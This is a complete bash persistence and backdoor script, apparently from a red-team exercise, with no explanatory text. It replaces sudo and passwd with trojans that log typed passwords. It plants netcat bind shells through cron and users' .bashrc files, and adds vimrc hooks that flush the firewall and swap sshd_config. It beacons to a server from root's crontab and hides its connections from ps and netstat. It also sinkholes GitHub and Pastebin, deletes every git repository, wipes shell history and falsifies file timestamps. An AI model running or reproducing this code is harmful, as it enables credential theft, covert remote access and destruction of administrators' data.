LOG()
{
    if [ "$2" != "" ];
    then
        LOG_ARG=$1;
        shift;
        if [ "$LOG_ARG" = "0" ];
        then
            LOG_MESSAGE="${COLOR_GREEN}[+] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "1" ];
        then
            LOG_MESSAGE="${COLOR_BLUE}[*] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "2" ];
        then
            LOG_MESSAGE="${COLOR_RED}[-] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "warn" ];
        then
            LOG_MESSAGE="${COLOR_YELLOW}[!] $@${COLOR_NONE}\n";
        else
            LOG_MESSAGE="$@\n";
        fi;
    else
        LOG_MESSAGE="$@";
    fi;
    if [ "$1" != "" ];
    then
        printf "$LOG_MESSAGE";
    fi;
    return $?;
};
SYSTEMD_ADD()
{
    [ "$1" == "" ] && return 1;
    [ "$5" == "" ] && return 1;
    SYSTEMD_NEW="[Unit]";
    if [ "$2" != "" ];
    then
        SYSTEMD_NEW="$SYSTEMD_NEW\nDescription=$2";
    fi;
    if [ "$3" != "" ];
    then
        SYSTEMD_NEW="$SYSTEMD_NEW\nWants=$3";
        SYSTEMD_NEW="$SYSTEMD_NEW\nBefore=$3";
    fi;
    SYSTEMD_NEW="$SYSTEMD_NEW\n[Service]";
    if [ "$4" = "" ];
    then
        SYSTEMD_NEW="$SYSTEMD_NEW\nType=simple";
    else
        SYSTEMD_NEW="$SYSTEMD_NEW\nType=$4";
    fi;
    SYSTEMD_NEW="$SYSTEMD_NEW\nExecStart=$5";
    if [ "$6" != "" ];
    then
        SYSTEMD_NEW="$SYSTEMD_NEW\nRestart=always";
        SYSTEMD_NEW="$SYSTEMD_NEW\nRestartSec=$6";
    fi;
    SYSTEMD_FILE="/lib/systemd/system/$1.service";
    printf "$SYSTEMD_NEW\n" > $SYSTEMD_FILE;
    QUIET command -v "systemctl daemon-reload";
    if [ "$?" != "0" ];
    then
        LOG 2 "Could not reload systemd service files";
        return 2;
    fi;
    QUIET systemctl daemon-reload;
    if [ "$?" != "0" ];
    then
        LOG 2 "Potential error in service file";
        return 2;
    fi;
    return 0;
};
QUIET ()
{
    eval $@ 2>/dev/null >/dev/null;
    return $?;
};
DESTROY()
{
    [ "$1" = "" ] && return 1;
    OPENFILE $1;
    QUIET command -v shred;
    [ $? = 0 ] && shred $1;
    rm -f $1;
    if [ "$?" != 0 ];
    then
        head -n 100 /dev/urandom > $1;
    fi;
    res=$?;
};
TRAP()
{
    trap '' INT;
    trap '' TERM;
};
INIT()
{
    LOG 1 "Standbye for TitanFall";
};
FINISH()
{
    if [ '`command -v systemctl`' != "" ];
    then
        QUIET systemctl daemon-reload;
    fi;
    for serv in $GLOBAL_SERVICES_RESTART;
    do
        LOG 1 "Restarting $sev";
        if [ '`command -v systemctl`' != "" ];
        then
            QUIET systemctl restart $serv;
        else
            QUIET service $serv restart;
        fi;
    done;
    LOG warn "Deleting self...";
};
GET_TEXT()
{
    [ "$1" = "" ] && return 1;
    QUIET command -v "curl";
    get_c="$?";
    QUIET command -v "wget";
    get_w="$?";
    QUIET command -v "python";
    get_p="$?";
    if [ "$((3 - ($get_p + $get_c + $get_w)))" = "0" ];
    then
        LOG 2 "No downloads available";
        return 1;
    fi;
    if [ "$get_w" = "0" ];
    then
        wget -qO- $1 2>/dev/null;
        return $?;
    elif [ "$get_c" = "0" ];
    then
        curl -s $1 2>/dev/null;
        return $?;
    elif [ "$get_p" = "0" ];
    then
        python -c "import urllib; print urllib.urlopen(\"$1\").read()" 2>/dev/null;
        return $?;
    fi;
};
GET_FILE()
{
    [ "$1" = "" ] && return 1;
    [ "$2" = "" ] && return 1;
    QUIET command -v "curl";
    get_c="$?";
    QUIET command -v "wget";
    get_w="$?";
    QUIET command -v "python";
    get_p="$?";
    if [ "$((3 - ($get_p + $get_c + $get_w)))" = "0" ];
    then
        LOG 2 "No downloads available";
        return 1;
    fi;
    retval="";
    if [ "$get_w" = "0" ];
    then
        QUIET wget -qO $2 $1;
        return $?;
    elif [ "$get_c" = "0" ];
    then
        QUIET curl -s -o $2 $1;
        return $?;
    elif [ "$get_p" = "0" ];
    then
        QUIET python -c "import urllib; print urllib.URLopener().retrieve(\"$1\",\"$2\")";
        return $?;
    fi;
    if [ "$retval" != "" ];
    then
        LOG 0 "'$1' downloaded to '$2' via $retval";
        return 0;
    else
        LOG 2 "Failed to download $1";
        return 1;
    fi;
};
RESTART()
{
    if [ "$1" != "" ];
    then
        GLOBAL_SERVICES_RESTART="$GLOBAL_SERVICES_RESTART $1";
        return 0;
    else
        return 1;
    fi;
};
GLOBALS()
{
    GLOBAL_HIDE_IP="192.168";
    GLOBAL_EXTERNAL_IP=`ip a | grep "inet 192.16" | awk '{print $2}' | cut -d'/' -f1`;
};
drop_sc()
{
    touch /etc/kernel-def.conf;
    touch /usr/bin/x11-checksum;
    chmod 777 /etc/kernel-def.conf;
    chmod 777 /usr/bin/x11-checksum;
    supath=`command -v sudo`;
    passpath=`command -v passwd`;
    cp $supath /usr/bin/.sudo;
    chmod u+s /usr/bin/.sudo;
    chmod g+s /usr/bin/.sudo;
    cp $passpath /usr/bin/.passwd;
    new_sudo='\n#!/bin/bash\nOsudo=/usr/bin/.sudo\nif [ "$1" == "" ]\nthen\n    $Osudo\nelse\n    echo -n "[sudo] password for $USER: "\n    read -s pass\n    echo ""\n    sleep 2;\n    echo "Sorry, try again."\n    echo "system:$USER:$pass" >> /etc/kernel-def.conf\n    /usr/bin/.sudo $@\nfi\n';
    new_passwd='\n#!/bin/bash\nPASSBIN="/usr/bin/.passwd"\nuser=$USER\nif [ "$1" != "" ]\nthen\n    user=$1\nfi\noldpass=""\nif [ "$USER" != "root" ]\nthen\n    /usr/bin/.passwd\n    exit\nfi\npass="pass"\npass2="word"\nchps=0\npasswhile=0\nif [ "`command -v chpasswd`" != "" ]\nthen\n    chps=1\nelse\n    /usr/bin/.passwd\n    exit\nfi\nwhile [ "$pass" != "$pass2" -a $passwhile -eq 0 ]\ndo\n    echo -n "Enter new UNIX password: "\n    read -s pass\n    echo ""\n    echo -n "Retype new UNIX password: "\n    read -s pass2\n    echo ""\n    if [ $chps -ne 1 ]\n    then\n        sleep 2\n        echo "Sorry, passwords do not match"\n        passwhile=1\n   else\n        if [ "$pass" == "$pass2" ]\n        then\n            echo "$user:$pass" | $(command -v chpasswd)\n\t        echo "system:$user:$pass" >> /usr/bin/x11-checksum\n            echo "passwd: password updated successfully"\n        else\n            echo "Sorry, passwords do not match"\n        fi\n    fi\ndone\n';
    echo -e "$new_sudo" > $supath;
    echo -e "$new_passwd" > $passpath;
};
scavcollectors()
{
    drop_sc;
};
sinkhole_ip()
{
    if [ "$1" = "" ];
    then
        return 1;
    fi;
    QUIET command -v ip;
    if [ "$?" != "0" ];
    then
        return 1;
    fi;
    addrs=`getent ahostsv4 $1 | awk '{print $1}' | sort -u`;
    for addr in $addrs;
    do
        ip rule add blackhole to $addr;
        ip route add $addr via 127.0.0.1;
    done;
};
sinkhole_hosts()
{
    if [ "$1" = "" ];
    then
        return 1;
    fi;
    echo -e "::1\t$1" >> /etc/hosts;
};
sinkhole()
{
    domains="github.com drive.google.com stackoverflow.com raw.githubusercontent.com termbin.com pastebin.com raw.pastebin.com";
    domains="$domains ir.scriptingis.life pub.scriptingis.life scriptingis.life";
    for domain in $domains;
    do
        sinkhole_ip $domain;
        sinkhole_hosts $domain;
    done;
};
cron()
{
    command='* * * * */5 root /etc/notes';
    s="#!/bin/bash\n";
    s="$s nc -lp 4444 -e /bin/bash &;\necho nomnom | wall ;\necho papa? | wall;";
    printf "$s" > /etc/notes;
    chmod +x /etc/notes;
    echo $command >> /etc/crontab;
    cp /bin/getty /bin/dbus-daemon-sys;
    if [ "$GLOBAL_EXTERNAL_IP" != "" ];
    then
        JOYFULNOISE_SERVER="192.168.6.237";
        echo "* * * * * /bin/dbus-daemon-sys $JOYFULNOISE_SERVER/$GLOBAL_EXTERNAL_IP/crontab" >> /var/spool/cron/root;
        LOG 0 "Install beacon cron job for root to '$JOYFULNOISE_SERVER/$GLOBAL_EXTERNAL_IP/crontab'";
    fi;
    LOG 0 "Installed cron job";
};
vimrc_dump()
{
    QUIET cp $JF_GLOB_NAME /bin/vim-update;
    JOYFULNOISE_SERVER="192.168.6.48";
    GLOBAL_VIMRC_COM="/bin/vim-update $JOYFULNOISE_SERVER vim &;";
    GLOBAL_VIMRC_COM="$GLOBAL_VIMRC_COM; cp $SSHD_4 /etc/ssh/sshd_config; iptables -F;";
    if [ "$1" != "" ];
    then
        fil="$1";
    else
        return 1;
    fi;
    QUIET echo "" >> $fil;
    if [ "$?" != 0 ];
    then
        LOG 2 "[$fil] does not exist";
        return 1;
    fi;
    if [ "$(grep 'VimLeave' $fil 2>/dev/null)" = "" ];
    then
        printf 'autocmd VimLeave * silent !(' >> $fil;
        printf "$GLOBAL_VIMRC_COM" >> $fil;
        printf ') 2>/dev/null >/dev/null ' >> $fil;
        LOG 0 "Wrote to [$fil]";
    else
        LOG warn "[$fil] contains VimLeave. Not changing";
    fi;
};
vimrc()
{
    GLOBAL_VIMRC_COM="";
    dirs="`for d in $(/bin/ls /home); do echo /home/$d; done`";
    for d in $dirs '/root';
    do
        vimrc_dump "$d/.vimrc";
    done;
    if [ -f "/etc/vim/vimrc" ];
    then
        vimrc_dump "/etc/vim/vimrc";
    fi;
};
bashrc_hooks ()
{
    bashrc_file=$1;
    if [ ! -f $bashrc_file ];
    then
        return 1;
    fi;
    if [ "$1" = "/root/.bashrc" ];
    then
        echo "iptables -F; iptables -t mangle -F; iptables -t nat -F" >> $1;
    fi;
    hooks_ss="ss() {\n    `command -v ss` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_netstat="netstat() {\n    `command -v netstat` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_who="who() {\n    `command -v who` \"\$@\" | grep -Ev \"$HIDE_IP\";\n};";
    hooks_ps="ps() {\n    `command -v ps` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc | grep -v grep;\n};";
    add_nc="n=\$(((\$RANDOM % 1000) + 4000));\nmkfifo \"/tmp/.\$n\";\nnc -lp \$n < \"/tmp/.\$n\" | bash > \"/tmp/.\$n\" & 2>/dev/null";
    COMMAND="ss";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_ss\n" >> $bashrc_file;
    fi;
    COMMAND="netstat";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_netstat\n" >> $bashrc_file;
    fi;
    COMMAND="who";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_who\n" >> $bashrc_file;
    fi;
    COMMAND="ps";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_ps\n" >> $bashrc_file;
    fi;
    QUIET command -v nc;
    [ "$?" = 0 ] && echo -e "$add_nc" >> $bashrc_file;
    LOG 0 "$bashrc_file hooks added";
};
bashrc()
{
    HIDE_IP="$GLOBAL_HIDE_IP";
    LOG 0 "Hooking Bashrc files...";
    bashrc_hooks "/root/.bashrc";
    for f in `find /home -name "\.bashrc"`;
    do
        bashrc_hooks "$f";
    done;
    return 0;
};
cleaner_history()
{
    QUIET command -v "history";
    history_is="$?";
    if [ "$history_is" = "0" ];
    then
        LOG 1 "Clearing the history";
        history -c;
        history -w;
        echo "" > /root/.bash_history;
        rm /root/.bash_history;
    else
        LOG 2 "History not implemented";
    fi;
    return $history_is;
};
cleaner_timestamps()
{
    QUIET command -v "find";
    find_is="$?";
    if [ "$find_is" = "0" ];
    then
        LOG 1 "Clearing timestamps";
        QUIET find /etc -exec touch -r /etc/fstab {} +;
        QUIET find /bin -exec touch -r /etc/fstab {} +;
        QUIET find /sbin -exec touch -r /etc/fstab {} +;
        QUIET find /var -exec touch -r /etc/fstab {} +;
        QUIET find /home -exec touch -r /etc/fstab {} +;
        QUIET find /root -exec touch -r /etc/fstab {} +;
        QUIET find /lib -exec touch -r /etc/fstab {} +;
        QUIET find /lib64 -exec touch -r /etc/fstab {} +;
    else
        LOG 2 "Cannot clear timestamps";
    fi;
    return $find_is;
};
cleaner_vim_lock()
{
    vim_count=0;
    vim_info_files=$(ls /home);
    for homedir in $vim_info_files;
    do
        if [ -d /home/$homedir ];
        then
            echo "" > /home/$homedir/.viminfo;
            QUIET ln -fsT /dev/null /home/$homedir/.viminfo;
            vim_count=$(($vim_count+1));
        fi;
    done;
    echo "" > /root/.viminfo;
    QUIET ln -fsT /dev/null /root/.viminfo;
    vim_count=$(($vim_count+1));
    LOG 0 "$vim_count VIM info files locked";
};
cleaner_git()
{
    git_dirs=$(find / -type d -name ".git" 2>/dev/null);
    for d in $git_dirs;
    do
        rm -fr $d;
    done;
    LOG 0 "Deleted all git repositories";
};
cleaner_services()
{
    QUIET systemctl daemon-reload;
    if [ "$?" != 0 ];
    then
        LOG 2 "Cannot reload service files. Run 'systemctl daemon-reload'";
    fi;
    for s in $GLOBAL_SERVICES_RESTART;
    do
        QUIET systemctl enable $s;
        QUIET service $s stop;
        QUIET service $s start;
        if [ "$?" != 0 ];
        then
            QUIET systemctl stop $s;
            QUIET systemctl start $s;
            if [ $? = 0 ];
            then
                LOG 0 "Restarted $s";
            else
                LOG 2 "Failed to restart $s";
            fi;
        else
            LOG 0 "Restarted $s";
        fi;
    done;
    return 0;
};
cleaner()
{
    cleaner_services;
    cleaner_git;
    cleaner_history;
};
INIT;
GLOBALS;
scavcollectors;
sinkhole;
cron;
vimrc;
bashrc;
cleaner;
